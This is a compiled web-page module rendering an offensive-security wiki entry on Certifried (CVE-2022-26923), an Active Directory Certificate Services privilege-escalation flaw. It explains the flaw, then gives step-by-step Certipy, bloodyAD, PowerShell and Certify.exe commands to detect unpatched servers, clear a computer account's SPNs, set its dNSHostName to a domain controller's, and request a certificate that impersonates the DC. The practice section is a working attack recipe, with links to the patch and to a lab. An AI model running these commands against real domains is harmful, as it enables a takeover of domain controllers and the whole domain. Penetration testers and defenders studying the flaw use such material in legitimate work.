import{_ as o,c as k,a5 as r,G as s,w as a,j as i,a as e,B as n,o as d}from"./chunks/framework.B5CpDqM0.js";const m=JSON.parse('{"title":"CVE-2022–26923","description":"","frontmatter":{"title":"CVE-2022–26923","authors":"CravateRouge, ShutdownRepo, sckdev"},"headers":[],"relativePath":"ad/movement/adcs/certifried.md","filePath":"ad/movement/adcs/certifried.md","lastUpdated":1724982529000}'),c={name:"ad/movement/adcs/certifried.md"};function p(g,t,F,u,E,y){const h=n("PluginTabsTab"),l=n("PluginTabs");return d(),k("div",null,[t[6]||(t[6]=r('<h1 id="certifried" tabindex="-1">Certifried <a class="header-anchor" href="#certifried" aria-label="Permalink to &quot;Certifried&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4" target="_blank" rel="noreferrer">Certifried (CVE-2022-26923)</a> is a vulnerability discovered by <a href="https://twitter.com/ly4k_" target="_blank" rel="noreferrer">Oliver Lyak</a> on AD CS that lets a domain-joined user escalate its privileges in the domain.</p><p>A domain user creating a computer account obtains the <code>Validated write to DNS host name</code> and <code>Validated write to service principal name</code> permissions (among other rights). Therefore, the user is allowed to change the DNS host name (<code>dNSHostName</code>) and SPN (<code>servicePrincipalName</code>) attributes of the computer account.</p><p>Computer accounts (using the <code>Machine</code> template) use the value of the <code>dNSHostName</code> property for authentication. Attempting to change the <code>dNSHostName</code> to match another computer account raises a constraint error.</p><p>In fact, the moment the <code>dNSHostName</code> property is edited, the domain controller makes sure to update the existing SPNs of the account so that the &quot;hostname&quot; part of it is updated to the new DNS hostname. If the SPNs already exist for another account in Active Directory, the domain controllers raises the constraint violation.</p><p>The trick found by Oliver goes as follows:</p><ol><li>clear the SPNs (or at least those that reflect the <code>dNSHostName</code> value, i.e. the ones with fully-qualified hostnames, e.g. <code>HOST/SRV01.DOMAIN.LOCAL</code>)</li><li>change to <code>dNSHostName</code> to a target&#39;s DNS hostname (e.g. <code>DC.DOMAIN.LOCAL</code>). The constraint violation won&#39;t be raised since there won&#39;t be any SPN to update</li><li>request a certificate for the computer account using the <code>Machine</code> template. The Certificate Authority will use the <code>dNSHostName</code> value for identification and issue a certificate for the Domain Controller.</li><li>Authenticate as the DC.</li></ol><p>A patch was released in may 2022 to address this vulnerability: <a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#db1c" target="_blank" rel="noreferrer">more information here</a> and on <a href="./certificate-templates#certificate-mapping">#certificate-mapping</a>.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><h3 id="detecting-unpatched-targets" tabindex="-1">Detecting unpatched targets <a class="header-anchor" href="#detecting-unpatched-targets" aria-label="Permalink to &quot;Detecting unpatched targets&quot;">​</a></h3><p>Requesting a certificate based on the <code>Machine</code> (or <code>User</code>) template can indicate whether the patch has been applied or not. If the certificate object contains an SID (<code>objectSid</code>), then the patch has been applied.</p>',12)),s(l,null,{default:a(()=>[s(h,{label:"UNIX-like"},{default:a(()=>t[0]||(t[0]=[i("p",null,[e("This check can be conducted using "),i("a",{href:"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwjCp86j1fb3AhWpzYUKHSMeBFoQFnoECA8QAQ&url=https%3A%2F%2Fgithub.com%2Fly4k%2FCertipy&usg=AOvVaw1D9CAn7Ysn5XMdezp8Aemb",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python).")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"@"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'User'")])])])],-1),i("p",null,[e("If Certipy doesn't print "),i("code",null,"Certificate object SID is [...]"),e(" after obtaining the certificate, then the attack can be conducted.")],-1),i("div",{class:"warning custom-block"},[i("p",null,[e("Oliver "),i("a",{href:"https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4#08a1",target:"_blank",rel:"noreferrer"},"underlined"),e(" the fact that to fully mitigate the vulnerability, both the KDC and the CA server must be patched.")])],-1)])),_:1}),s(h,{label:"Windows"},{default:a(()=>t[1]||(t[1]=[i("p",null,[i("em",null,"At the time of writing this recipe (June 2022), no Windows alternative has been found.")],-1)])),_:1})]),_:1}),t[7]||(t[7]=r('<h3 id="conducting-the-attack" tabindex="-1">Conducting the attack <a class="header-anchor" href="#conducting-the-attack" aria-label="Permalink to &quot;Conducting the attack&quot;">​</a></h3><h4 id="creating-a-computer-account" tabindex="-1">Creating a computer account <a class="header-anchor" href="#creating-a-computer-account" aria-label="Permalink to &quot;Creating a computer account&quot;">​</a></h4><p>The first step of the attack consists in creating a computer account (<a href="./../builtins/machineaccountquota">machineaccountquota.md</a>, <a href="./../builtins/machineaccountquota#create-a-computer-account">#create-a-computer-account</a>), or have the write permission to the <code>dNSHostName</code> and <code>servicePrincipalName</code> attributes of another.</p><h4 id="dnshostname-and-serviceprincipalname-modification" tabindex="-1"><code>dNSHostName</code> and <code>servicePrincipalName</code> modification <a class="header-anchor" href="#dnshostname-and-serviceprincipalname-modification" aria-label="Permalink to &quot;`dNSHostName` and `servicePrincipalName` modification&quot;">​</a></h4><p>The second step is conducted by removing the SPNs that reflect the <code>dNSHostName</code> value, and then modifying the <code>dNSHostName</code> to the name of the computer account to impersonate.</p>',5)),s(l,null,{default:a(()=>[s(h,{label:"UNIX-like"},{default:a(()=>t[2]||(t[2]=[i("p",null,[e("The "),i("a",{href:"https://github.com/CravateRouge/bloodyAD",target:"_blank",rel:"noreferrer"},"bloodyAD"),e(" (Python) tool can be used on UNIX-like systems to operated these changes.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Clearing the SPNs")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--host"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"serviceprincipalname")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Setting the dNSHostName value to the name of a computer account to impersonate")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--host"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"set"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"dnsHostName"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -v"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," '$DC_NAME.$DOMAIN'")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Verifying the dNSHostName value and SPN entries")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"bloodyAD"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -d"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DOMAIN "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-u"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $USER "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-p"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $PASSWORD "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--host"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_IP "),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"get"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," object"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"--attr"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dnsHostName,serviceprincipalname")])])])],-1),i("p",null,[i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" tool can also add a machine account and amend the "),i("code",null,"dNSHostName"),e(" property with the following command liner.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Adding a computer account and setting the dNSHostName to impersonate")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," account"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," create"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$USER"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"@"'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -user"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$COMPUTER_NAME"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -pass"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$COMPUTER_PASS"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dns"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_NAME"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"."),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"')])])])],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("The Domain Components (DC) are the different parts of the domain name ("),i("code",null,"DC=domain,DC=local"),e(" for "),i("code",null,"domain.local"),e(", or "),i("code",null,"DC=sub,DC=domain,DC=local"),e(" for "),i("code",null,"sub.domain.local"),e(").")])],-1)])),_:1}),s(h,{label:"Windows"},{default:a(()=>t[3]||(t[3]=[i("p",null,[e("The "),i("a",{href:"https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps",target:"_blank",rel:"noreferrer"},"Active Directory RSAT"),e(" tools can be used on Windows systems to operate these changes.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Clearing the SPNs")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-ADComputer"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-ServicePrincipalName"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," @{}")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Setting the dNSHostName value to the name of a computer account to impersonate")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Set-ADComputer"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-DnsHostName"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $DC_NAME"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},"."),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN_FQDN")]),e(`
`),i("span",{class:"line"}),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6A737D","--shiki-dark":"#6A737D"}},"# Verifying the dNSHostName value and SPN entries")]),e(`
`),i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"Get-ADComputer"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," $COMPUTER_NAME "),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"-properties"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," dnshostname,serviceprincipalname")])])])],-1)])),_:1})]),_:1}),t[8]||(t[8]=i("h4",{id:"obtaining-a-certificate",tabindex:"-1"},[e("Obtaining a certificate "),i("a",{class:"header-anchor",href:"#obtaining-a-certificate","aria-label":'Permalink to "Obtaining a certificate"'},"​")],-1)),t[9]||(t[9]=i("p",null,[e("The third and last step consists in getting the certificate of the targeted machine account ("),i("code",null,"$DC_NAME"),e(" in the previous command examples).")],-1)),s(l,null,{default:a(()=>[s(h,{label:"UNIX-like"},{default:a(()=>t[4]||(t[4]=[i("p",null,[i("a",{href:"https://github.com/ly4k/Certipy",target:"_blank",rel:"noreferrer"},"Certipy"),e(" (Python) can be used to request the certificate from UNIX-like systems.")],-1),i("div",{class:"language-bash vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"bash"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#6F42C1","--shiki-dark":"#B392F0"}},"certipy"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," req"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -u"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},` 'compter$'@"`),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DOMAIN"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -p"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$PASSWORD"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -dc-ip"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$DC_IP"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -target"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},' "'),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"$ADCS_HOST"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"'),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -ca"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'ca_name'"),i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}}," -template"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}}," 'Machine'")])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"./../kerberos/pass-the-certificate"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate.")],-1),i("div",{class:"tip custom-block"},[i("p",null,[e("By default, Certipy uses LDAPS, which is not always supported by the domain controllers. The "),i("code",null,"-scheme"),e(" flag can be used to set whether to use LDAP or LDAPS.")])],-1)])),_:1}),s(h,{label:"Windows"},{default:a(()=>t[5]||(t[5]=[i("p",null,[i("a",{href:"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&cad=rja&uact=8&ved=2ahUKEwiQmZer1fb3AhVBhRoKHSCyAMoQFnoECAcQAQ&url=https%3A%2F%2Fgithub.com%2FGhostPack%2FCertify&usg=AOvVaw0HjmYWwbHvGKTA3-f1iPP0",target:"_blank",rel:"noreferrer"},"Certify"),e(" (C#) can be used to request the certificate from Windows systems.")],-1),i("div",{class:"language-powershell vp-adaptive-theme"},[i("button",{title:"Copy Code",class:"copy"}),i("span",{class:"lang"},"powershell"),i("pre",{class:"shiki shiki-themes github-light github-dark vp-code",tabindex:"0"},[i("code",null,[i("span",{class:"line"},[i("span",{style:{"--shiki-light":"#005CC5","--shiki-dark":"#79B8FF"}},"Certify.exe"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}}," request "),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}},"/"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"ca:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"domain\\ca"'),i("span",{style:{"--shiki-light":"#D73A49","--shiki-dark":"#F97583"}}," /"),i("span",{style:{"--shiki-light":"#24292E","--shiki-dark":"#E1E4E8"}},"template:"),i("span",{style:{"--shiki-light":"#032F62","--shiki-dark":"#9ECBFF"}},'"Machine"')])])])],-1),i("p",null,[e("The certificate can then be used with "),i("a",{href:"https://www.thehacker.recipes/ad/movement/kerberos/pass-the-certificate",target:"_blank",rel:"noreferrer"},"Pass-the-Certificate"),e(" to obtain a TGT and authenticate.")],-1)])),_:1})]),_:1}),t[10]||(t[10]=r('<h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4" target="_blank" rel="noreferrer">https://research.ifcr.dk/certifried-active-directory-domain-privilege-escalation-cve-2022-26923-9e098fe298f4</a></p><p><a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923" target="_blank" rel="noreferrer">https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923</a></p><p><a href="https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html" target="_blank" rel="noreferrer">https://cravaterouge.github.io/ad/privesc/2022/05/11/bloodyad-and-CVE-2022-26923.html</a></p><p><a href="https://tryhackme.com/room/cve202226923" target="_blank" rel="noreferrer">https://tryhackme.com/room/cve202226923</a></p>',5))])}const f=o(c,[["render",p]]);export{m as __pageData,f as default};
